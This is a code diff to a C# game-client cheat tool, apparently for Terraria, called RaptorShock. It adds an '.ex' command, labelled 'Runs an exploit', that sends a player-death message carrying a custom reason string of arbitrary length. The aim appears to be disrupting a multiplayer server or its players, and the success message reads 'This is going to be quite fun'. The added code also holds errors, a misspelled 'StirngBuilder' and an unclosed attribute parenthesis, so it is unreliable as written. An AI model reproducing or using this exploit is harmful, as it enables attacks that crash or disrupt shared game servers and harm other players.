@@ -285,5 +285,19 @@ namespace RaptorShock
             Utils.LocalPlayerItem.useTime = useTime;
             Utils.ShowSuccessMessage($"Set use time to '{useTime}'.");
         }
+
+        [Command("ex", ".ex length",
+            HelpText = "Runs an exploit."]
+        public void SendExploit(int length)
+        {
+            StringBuilder sb = new StirngBuilder();
+            for (int i = 0; i < length; i++)
+            {
+                sb.Append("a");
+            }
+
+            NetMessage.SendPlayerDeath(Utils.LocalPlayer.whoAmI, PlayerDeathReason.ByCustomReason(sb.ToString()), 1, 1, false);
+            Utils.ShowSuccessMessage("This is going to be quite fun.");
+        }
     }
 }
